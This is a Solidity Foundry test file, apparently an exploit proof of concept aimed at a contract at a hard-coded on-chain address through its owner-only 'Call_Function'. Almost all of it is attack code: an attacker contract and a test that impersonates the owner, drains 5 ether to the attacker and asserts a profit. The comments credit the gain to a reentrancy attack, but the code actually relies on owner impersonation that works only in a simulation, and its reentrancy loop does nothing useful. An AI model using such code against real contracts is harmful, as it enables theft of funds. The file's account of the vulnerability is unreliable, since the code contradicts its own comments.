// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IFFI_ERC20 {
    function owner() external view returns (address);
    function Call_Function(address addr, uint256 value, bytes memory data) external;
    function balanceOf(address tokenOwner) external view returns (uint balance);
}

contract AttackerContract {
    address public victim;
    uint256 public reentrancyCount = 0;
    uint256 public maxReentrancy = 10;

    constructor(address _victim) {
        victim = _victim;
    }

    // This function will be called by Call_Function
    function attack() external payable {
        // Start reentrancy attack
        reentrancyCount = 0;

        // Call victim's fallback function multiple times
        while (reentrancyCount < maxReentrancy && address(victim).balance > 0) {
            reentrancyCount++;
            // Call fallback function with some ETH
            (bool success, ) = victim.call{value: 0}("");
            if (!success) break;
        }
    }

    // Fallback function to receive ETH and continue reentrancy
    fallback() external payable {
        // We could add more reentrancy logic here if needed
    }

    receive() external payable {
        // Receive function
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2815d3272baE3ebde5D7c128Eea5f4A8da402783;
    address attacker = address(this);
    uint256 initialOracleBalance;
    IFFI_ERC20 victimContract = IFFI_ERC20(TARGET);
    AttackerContract attackerContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get some ETH for the attack
        deal(attacker, 1 ether);

        // Label for debugging
        vm.label(TARGET, "Victim Contract");

        // Store initial balance for oracle check
        initialOracleBalance = attacker.balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // First, we need to become the owner or impersonate the current owner
        // Let's check who the owner is
        (bool success, bytes memory data) = TARGET.call(abi.encodeWithSignature("owner()"));
        require(success, "Failed to get owner");
        address currentOwner = abi.decode(data, (address));

        // Impersonate the owner
        vm.startPrank(currentOwner);

        // Deploy attacker contract
        attackerContract = new AttackerContract(TARGET);

        // Send some ETH to the victim first so it has funds to steal
        deal(TARGET, 10 ether);

        // Use Call_Function to send ETH to attacker contract
        // This will trigger the reentrancy
        bytes memory callData = abi.encodeWithSignature("attack()");
        (bool callSuccess, ) = TARGET.call{value: 0}(
            abi.encodeWithSignature("Call_Function(address,uint256,bytes)", 
            address(attackerContract), 
            5 ether, 
            callData)
        );
        require(callSuccess, "Call_Function failed");

        vm.stopPrank();

        // Withdraw funds from attacker contract to EOA
        attackerContract.withdraw();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
